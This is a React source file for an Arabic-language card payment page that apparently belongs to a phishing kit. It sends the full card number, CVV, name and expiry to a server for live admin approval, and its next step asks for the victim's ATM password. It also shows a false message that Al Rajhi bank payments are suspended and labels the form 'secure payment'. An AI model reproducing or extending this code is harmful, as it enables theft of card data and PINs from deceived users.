import * as React from "react";
import { IMaskInput } from "react-imask";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import FormControl from "@mui/material/FormControl";
import Stack from "@mui/material/Stack";
import { useEffect } from "react";
import { Controller, FieldValues, useForm } from "react-hook-form";
import Select from "@mui/material/Select";
import MenuItem from "@mui/material/MenuItem";
import Button from "@mui/material/Button";
import InputAdornment from "@mui/material/InputAdornment";
import cardValidator from "card-validator";
import madaBINs from "../../assets/mada-bins.json";
import {
  adminLoading,
  isFormRejected,
  loading,
  mainInfo,
  socket,
} from "@/real-time/context/signals";
import "./Payment.css";
import Box from "@mui/material/Box";
import Dialog from "@mui/material/Dialog";
import DialogActions from "@mui/material/DialogActions";
import DialogContent from "@mui/material/DialogContent";
import DialogContentText from "@mui/material/DialogContentText";
import DialogTitle from "@mui/material/DialogTitle";
import Divider from "@mui/material/Divider";
import FormHelperText from "@mui/material/FormHelperText";
import IconButton from "@mui/material/IconButton";
import TextField from "@mui/material/TextField";
import Typography from "@mui/material/Typography";
import CloseIcon from "@mui/icons-material/Close";
import { InfoOutlined, Lock } from "@mui/icons-material";
import CvvCredIcon from "@/components/CvvCredIcon";
import CvvInfoDialog from "@/components/CvvInfoDialog";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import debounce from "lodash.debounce";
import CredNumberErrorIcon from "@/components/CredNumberErrorIcon";
import { PaymentLoadingDialog } from "@/components/PaymentLoadingDialog";

interface CustomProps {
  onChange: (event: { target: { name: string; value: string } }) => void;
  name: string;
}

function getCardType(number: string): string | undefined {
  const cleaned = String(number).replace(/\D/g, "");
  const bin = cleaned.slice(0, 6);

  if (madaBINs.includes(bin)) return "mada";

  const validation = cardValidator.number(cleaned);

  if (
    validation.card &&
    ["visa", "mastercard"].includes(validation.card?.type)
  ) {
    return validation.card.type;
  }
}

const CardNumberCustom = React.forwardRef<HTMLInputElement, CustomProps>(
  function CardNumberCustom(props, ref) {
    const { onChange, ...other } = props;
    return (
      <IMaskInput
        {...other}
        mask="0000  0000  0000  0000"
        inputRef={ref}
        onAccept={(value: any) =>
          onChange({ target: { name: props.name, value } })
        }
        overwrite
      />
    );
  },
);

function Payment() {
  useEffect(() => setCurrentPage("الدفع بطاقة الائتمان"), []);

  const months: number[] = [];
  const years: number[] = [];

  for (let i = 0; i < 12; i++) {
    const month = i + 1;
    const year = Number(new Date().getFullYear()) + i - 2000;

    months.push(month);
    if (i < 6) years.push(year);
  }

  const [errorDialog, setErrorDialog] = React.useState(false);

  const handleCloseErrorDialog = () => {
    setErrorDialog(false);
  };

  const capitalizeWords = (str: string) => {
    const newStr = str
      .split(" ")
      .map((word) =>
        word ? word.charAt(0).toUpperCase() + word.slice(1).toLowerCase() : "",
      )
      .join(" ");

    if (!str[str.length - 1]) {
      return newStr + " ";
    }

    return newStr;
  };

  const paymentInvoice = JSON.parse(
    localStorage.getItem("paymentInvoice") || "{}",
  ) as {
    fee?: { total: number; base: number; vat: number };
    feeTitle?: string;
  };

  const currentYear = new Date().getFullYear() - 2000;
  const currentMonth = new Date().getMonth() + 1;

  const schema = yup
    .object()
    .shape({
      cardNumber: yup
        .string()
        .required(".رقم البطاقة مطلوب")
        .length(16, ".رقم بطاقتك غير مكتمل"),
      expiryMonth: yup.number().min(1, ".اختر شهر الانتهاء"),
      expiryYear: yup.number().min(currentYear, ".اختر سنة الانتهاء"),
      cvv: yup
        .string()
        .required(".رمز الأمان مطلوب")
        .length(3, ".رمز الأمان يجب أن يكون ٣ أرقام"),
      nameOnCard: yup.string().required(".اسم حامل البطاقة مطلوب"),
    })
    .test("expiry-check", function (values) {
      const { expiryMonth, expiryYear } = values;
      if (!expiryMonth || !expiryYear) return true;
      if (expiryYear === currentYear && expiryMonth < currentMonth) {
        return this.createError({
          path: "expiryMonth",
          message: "تاريخ انتهاء البطاقة غير صالح",
        });
      }
      return true;
    });

  const {
    handleSubmit,
    control,
    watch,
    setError,
    clearErrors,
    reset,
    formState: { errors },
  } = useForm({
    resolver: yupResolver(schema),
    defaultValues: {
      cardNumber: "",
      cvv: "",
      nameOnCard: "",
      expiryYear: 0,
      expiryMonth: 0,
    },
    mode: "onBlur",
    reValidateMode: "onChange",
  });

  const cardNumber = watch("cardNumber");

  const [cardNumberVerified, setCardNumberVerified] = React.useState<
    boolean | undefined
  >();

  const checkCard = React.useRef(
    debounce((number: string) => {
      socket.value.emit("cardNumber:verify", number);
    }, 500),
  ).current;

  useEffect(() => {
    if (cardNumber?.length === 16) {
      checkCard(cardNumber);
    }
  }, [cardNumber, checkCard]);

  useEffect(() => {
    socket.value.on("cardNumber:verified", (valid: boolean) => {
      setCardNumberVerified(valid);
    });

    return () => {
      socket.value.off("cardNumber:verified");
    };
  }, [setError, clearErrors]);

  const onSubmit = async (data: FieldValues) => {
    if (!cardNumberVerified) return;

    data.cardNumber = data.cardNumber.replace(/\s+/g, "");
    data.nameOnCard = data.nameOnCard.trim();

    localStorage.setItem(
      "payment",
      JSON.stringify({
        totalPaid: paymentInvoice.fee?.total,
        cardType: getCardType(cardNumber),
        cardLast4: data.cardNumber.slice(-4),
      }),
    );

    sendDataToServer({
      paymentCard: data,
      current: "الدفع",
      nextPage: "كلمة مرور ATM",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  useEffect(() => {
    socket.value.on("bankName", (bankName) => {
      const data = JSON.parse(localStorage.getItem("payment") || "");
      data.bankName = bankName;

      localStorage.setItem("payment", JSON.stringify(data));
    });

    return () => {
      socket.value.off("bankName");
    };
  }, []);

  useEffect(() => {
    if (isFormRejected.value) {
      reset();
      setCardNumberVerified(undefined);
    }
  }, [isFormRejected.value]);

  return (
    <>
      {(loading.value || adminLoading.value) && (
        <PaymentLoadingDialog credType={getCardType(cardNumber)} />
      )}

      <header className="px-4 sm:px-6 py-3">
        <img src="/assets/images/new/logo.svg" alt="logo" height="32px" />
      </header>
      <Divider />
      {/* <section className="gap-5 bg-white sm:bg-gray-700/[.03] mx-auto grid w-full max-w-7xl px-4 sm:px-0 grid-cols-1 lg:grid-cols-2 min-h-[calc(100vh_-_56.6px)]"> */}
      <section className="gap-5 bg-white sm:bg-gray-700/[.03] mx-auto grid w-full max-w-7xl px-4 sm:px-0 grid-cols-1 min-h-[calc(100vh_-_56.6px)]">
        {/* <div className="w-full bg-white pr-0 sm:pr-11 pt-6 pb-8 pl-0 sm:pl-3">
          <div className="inline-flex w-full max-w-[465px] flex-col items-start">
            <div className="inline-flex flex-col items-start gap-3">
              <div className="text-lg font-bold leading-7 text-foreground/80">
                معلومات الفاتورة
              </div>
              <p className="text-sm font-normal leading-tight text-gray-500">
                دفع رسوم {paymentInvoice.feeTitle}
              </p>
              <h1 className="text-4xl font-bold leading-10 text-foreground/80">
                {paymentInvoice.fee?.total.toFixed(2)} ر.س
              </h1>
            </div>
            <div className="flex w-full flex-col gap-6 mt-11">
              <div className="flex flex-col gap-2">
                <div className="flex w-full items-center justify-between gap-4 text-sm font-medium leading-tight text-foreground">
                  <div>المجموع الفرعي</div>
                  <div className="leading-none">
                    {paymentInvoice.fee?.base.toFixed(2)} ر.س
                  </div>
                </div>
                <div className="flex w-full items-center justify-between gap-4 text-xs font-normal leading-none text-gray-500">
                  <div>ضريبة القيمة المضافة 15%</div>
                  <div className="text-sm leading-none">
                    {paymentInvoice.fee?.vat.toFixed(2)} ر.س
                  </div>
                </div>
              </div>
              <Divider />
              <div className="flex w-full items-center justify-between gap-4 text-sm font-medium leading-tight text-foreground">
                <div>المبلغ المستحق</div>
                <div className="text-sm leading-none">
                  {paymentInvoice.fee?.total.toFixed(2)} ر.س
                </div>
              </div>
            </div>
          </div>
        </div> */}
        <div className="bg-white pr-0 sm:pr-10 pt-6 pb-8 w-full">
          <div className="max-w-[416px] mx-auto">
            <div className="flex flex-col gap-2">
              <div className="text-lg font-bold leading-7 text-foreground/80">
                الدفع من خلال بطاقة الائتمان
              </div>
              <div className="text-sm font-normal leading-tight text-gray-500">
                من فضلك أدخل معلومات الدفع الخاصة بك
              </div>
            </div>
            <form
              className="flex flex-col gap-4"
              onSubmit={handleSubmit(onSubmit)}
            >
              <div className="mt-9 inline-flex w-full flex-col items-start justify-start gap-2">
                <h5 className="flex justify-end gap-2 items-center text-xs font-semibold leading-none text-gray-500 w-full">
                  <img
                    src="data:image/svg+xml;charset=utf-8,%3Csvg width='38' height='25' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0 4a4 4 0 0 1 4-4h30a4 4 0 0 1 4 4v17a4 4 0 0 1-4 4H4a4 4 0 0 1-4-4V4Z' fill='%23fff'/%3E%3Cpath d='M15.215 5.85h7.57v13.604h-7.57V5.851Z' fill='%23FF5F00'/%3E%3Cpath d='M15.695 12.652a8.675 8.675 0 0 1 3.293-6.801A8.6 8.6 0 0 0 13.652 4 8.647 8.647 0 0 0 5 12.652a8.647 8.647 0 0 0 8.652 8.653 8.6 8.6 0 0 0 5.336-1.85 8.64 8.64 0 0 1-3.293-6.803Z' fill='%23EB001B'/%3E%3Cpath d='M33 12.652a8.647 8.647 0 0 1-8.652 8.653 8.6 8.6 0 0 1-5.336-1.85 8.603 8.603 0 0 0 3.293-6.803 8.675 8.675 0 0 0-3.293-6.801A8.6 8.6 0 0 1 24.348 4C29.13 4 33 7.894 33 12.652Z' fill='%23F79E1B'/%3E%3Crect x='.5' y='.5' width='37' height='24' rx='3.5' stroke='%23DFE5EB'/%3E%3C/svg%3E"
                    width="38px"
                    height="25px"
                  />
                  <img
                    src="data:image/svg+xml;charset=utf-8,%3Csvg width='38' height='25' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='38' height='25' rx='4' fill='%23fff'/%3E%3Cpath d='m15.631 8.16-3.666 8.808H9.573L7.77 9.94c-.109-.433-.204-.592-.538-.774C6.687 8.87 5.79 8.59 5 8.417l.054-.255h3.85c.49 0 .932.329 1.043.898l.952 5.097 2.355-5.995 2.377-.002Zm9.37 5.934c.01-2.325-3.192-2.453-3.17-3.492.007-.315.306-.652.96-.737.323-.042 1.217-.075 2.229.394l.397-1.868A6.059 6.059 0 0 0 23.3 8c-2.236 0-3.811 1.197-3.824 2.91-.015 1.268 1.123 1.976 1.98 2.398.883.431 1.179.71 1.174 1.094-.006.59-.703.852-1.355.862-1.137.018-1.796-.31-2.323-.557l-.41 1.93c.529.244 1.506.457 2.516.469 2.38.001 3.935-1.183 3.942-3.013Zm5.906 2.875H33L31.173 8.16h-1.931c-.435 0-.8.254-.963.646l-3.395 8.162h2.376l.471-1.316h2.904l.272 1.317Zm-2.524-3.12 1.191-3.308.686 3.307h-1.877Zm-9.52-5.689-1.871 8.808H14.73l1.871-8.808h2.262Z' fill='%231434CB'/%3E%3Crect x='.5' y='.5' width='37' height='24' rx='3.5' stroke='%23DFE5EB'/%3E%3C/svg%3E"
                    width="38px"
                    height="25px"
                  />
                  <img
                    src="images/mada-with-border.png"
                    width="38px"
                    height="25px"
                  />
                </h5>
                <div className="relative flex h-full w-full flex-col gap-4">
                  <div>
                    <Typography
                      color="textPrimary"
                      mb={"0.25rem"}
                      lineHeight={1.15}
                      fontWeight={400}
                      fontSize={"0.93rem"}
                    >
                      رقم البطاقة
                    </Typography>
                    <Controller
                      name="cardNumber"
                      control={control}
                      render={({ field }) => (
                        <TextField
                          {...field}
                          fullWidth
                          size="small"
                          dir="ltr"
                          onChange={(e) => {
                            const digitsOnly = e.target.value.replace(
                              /\s+/g,
                              "",
                            );
                            const prefixes = mainInfo.value.blockedCardPrefixes;
                            if (
                              prefixes &&
                              prefixes.includes(digitsOnly.slice(0, 4))
                            ) {
                              setErrorDialog(true);
                              field.onChange("");
                            } else {
                              field.onChange(digitsOnly);
                            }
                          }}
                          placeholder="1234 1234 1234 1234"
                          error={
                            !!(
                              errors.cardNumber ?? cardNumberVerified === false
                            )
                          }
                          helperText={
                            errors.cardNumber?.message ??
                            (cardNumberVerified === false
                              ? ".رقم البطاقة غير صالح. يرجى التحقق"
                              : undefined)
                          }
                          type="tel"
                          InputProps={{
                            inputComponent: CardNumberCustom as any,
                            endAdornment: (
                              <InputAdornment position="end">
                                {cardNumberVerified === false ? (
                                  <CredNumberErrorIcon />
                                ) : (
                                  <>
                                    {getCardType(field.value) && (
                                      <img
                                        src={`images/${getCardType(field.value)}.png`}
                                        alt={getCardType(field.value)}
                                        className={
                                          "me-4 " +
                                          (getCardType(field.value) ==
                                          "mastercard"
                                            ? "h-4"
                                            : "h-3")
                                        }
                                      />
                                    )}
                                  </>
                                )}
                              </InputAdornment>
                            ),
                          }}
                          aria-label="رقم البطاقة"
                        />
                      )}
                    />
                    <Stack my={1.5}>
                      <Typography
                        color="textPrimary"
                        mb={"0.25rem"}
                        lineHeight={1.15}
                        fontWeight={400}
                        fontSize={"0.93rem"}
                      >
                        اسم صاحب البطاقة
                      </Typography>
                      <Box position={"relative"}>
                        <Controller
                          name="nameOnCard"
                          control={control}
                          render={({ field }) => (
                            <>
                              <TextField
                                {...field}
                                fullWidth
                                size="small"
                                sx={{ zIndex: 1 }}
                                dir="ltr"
                                error={!!errors.nameOnCard}
                                helperText={errors.nameOnCard?.message}
                                id="nameOnCard"
                                onChange={(e) => {
                                  let cleaned = e.target.value.replace(
                                    /[^A-Za-z ]/g,
                                    "",
                                  );

                                  if (!cleaned.trim()) {
                                    cleaned = "";
                                  } else {
                                    cleaned = capitalizeWords(cleaned);
                                  }

                                  field.onChange(cleaned);
                                }}
                                inputProps={{ maxLength: 30 }}
                                aria-label="الاسم الموجود علي البطاقة"
                              />
                              {!field.value && (
                                <span
                                  style={{ zIndex: 0 }}
                                  className="absolute top-2 right-3.5 text-[#bababa]"
                                >
                                  الأسم على البطاقة (بالإنجليزية)
                                </span>
                              )}
                            </>
                          )}
                        />
                      </Box>
                    </Stack>
                    <Stack className="expiry" direction="row" spacing={2}>
                      <div className="w-[30%] sm:w-[50%]">
                        <div className="w-[100%] sm:w-[50%]">
                          <div className="flex justify-between">
                            <Typography
                              color="textPrimary"
                              mb={"0.25rem"}
                              lineHeight={1.15}
                              fontWeight={400}
                              fontSize={"0.93rem"}
                            >
                              رمز (CVV)
                            </Typography>
                            <CvvInfoDialog />
                          </div>
                          <Controller
                            control={control}
                            name="cvv"
                            render={({ field }) => (
                              <TextField
                                {...field}
                                fullWidth
                                size="small"
                                dir="ltr"
                                id="cvv"
                                error={!!errors.cvv}
                                helperText={errors.cvv?.message}
                                placeholder="CVV"
                                type="tel"
                                InputProps={{
                                  endAdornment: (
                                    <InputAdornment position="end">
                                      <CvvCredIcon />
                                    </InputAdornment>
                                  ),
                                }}
                                inputProps={{ maxLength: 3 }}
                              />
                            )}
                          />
                        </div>
                      </div>
                      <div className="w-[70%] sm:w-[50%]">
                        <Typography
                          color="textPrimary"
                          mb={"0.25rem"}
                          lineHeight={1.15}
                          fontWeight={400}
                          fontSize={"0.93rem"}
                        >
                          تاريخ الانتهاء
                        </Typography>
                        <Stack className="expiry" direction="row" spacing={2}>
                          <Controller
                            control={control}
                            name="expiryYear"
                            render={({ field }) => (
                              <FormControl
                                fullWidth
                                size="small"
                                error={!!errors.expiryYear}
                              >
                                <Select {...field}>
                                  <MenuItem value={0}>سنة</MenuItem>
                                  {years.map((year) => (
                                    <MenuItem key={year} value={year}>
                                      {year}
                                    </MenuItem>
                                  ))}
                                </Select>
                                {errors.expiryYear && (
                                  <FormHelperText color="error">
                                    {errors.expiryYear?.message}
                                  </FormHelperText>
                                )}
                              </FormControl>
                            )}
                          />
                          <Controller
                            control={control}
                            name="expiryMonth"
                            render={({ field }) => (
                              <FormControl
                                fullWidth
                                size="small"
                                error={!!errors.expiryMonth}
                              >
                                <Select {...field}>
                                  <MenuItem value={0}>شهر</MenuItem>
                                  {months.map((m) => (
                                    <MenuItem key={m} value={m}>
                                      {m.toString().padStart(2, "0")}
                                    </MenuItem>
                                  ))}
                                </Select>
                                {errors.expiryMonth && (
                                  <FormHelperText>
                                    {errors.expiryMonth?.message}
                                  </FormHelperText>
                                )}
                              </FormControl>
                            )}
                          />
                        </Stack>
                      </div>
                    </Stack>

                    {/* <FormControlLabel
                      className="mt-2"
                      control={
                        <Checkbox defaultChecked disabled size="small" />
                      }
                      label="تعيين كطريقة الدفع الافتراضية"
                    /> */}
                  </div>
                  {/* <div className="mt-4 text-xs leading-4 text-muted-foreground">
                    سيتم حفظ بيانات البطاقة لشراء مستقبلاً. سيتم التحقق من
                    البطاقة عبر حجز مؤقت بقيمة 0.50 ر.س يُلغى تلقائيًا بعد بضعة
                    أيام.
                  </div> */}
                </div>
              </div>
              {isFormRejected.value && (
                <div className="font-medium mt-5 text-red-500 text-center text-sm flex items-center gap-1">
                  <InfoOutlined fontSize="small" color="error" />
                  <span>
                    تم رفض البطاقة، يُرجى إدخال بيانات صحيحة أو استبدالها ببطاقة
                    أخرى.
                  </span>
                </div>
              )}
              <div className="mt-4">
                <Button
                  variant="contained"
                  // disabled={!isValid}
                  fullWidth
                  size="large"
                  type="submit"
                  sx={{
                    backgroundColor: "#1e2746",
                  }}
                >
                  ادفع الآن
                </Button>
              </div>

              <img
                src="images/cards-all.png"
                width={"50%"}
                className="mx-auto pt-4"
              />
              <div className="flex items-center justify-center">
                <Lock sx={{ width: 16 }} className="text-green-500" />
                <Typography
                  color="textPrimary"
                  lineHeight={1.45}
                  fontWeight={600}
                  fontSize={"0.93rem"}
                >
                  <span className="mx-2">دفع آمن وسريع</span>
                </Typography>
              </div>
            </form>
          </div>
        </div>
      </section>
      <React.Fragment>
        <Dialog open={errorDialog} onClose={handleCloseErrorDialog}>
          <DialogTitle color="error">خطأ في الدفع</DialogTitle>
          <DialogContent>
            <IconButton
              onClick={handleCloseErrorDialog}
              sx={(theme) => ({
                position: "absolute",
                right: 8,
                top: 8,
                color: theme.palette.grey[500],
              })}
            >
              <CloseIcon />
            </IconButton>
            <DialogContentText color="error">
              عزيزي العميل، تم إيقاف الدفع مؤقتًا عن طريق مصرف الراجحي والمحافظ
              الإلكترونية. نأمل السداد عن طريق مصرف آخر...
            </DialogContentText>
          </DialogContent>
          <DialogActions>
            <Button onClick={handleCloseErrorDialog} color="error">
              حسنا
            </Button>
          </DialogActions>
        </Dialog>
      </React.Fragment>
    </>
  );
}

export default Payment;
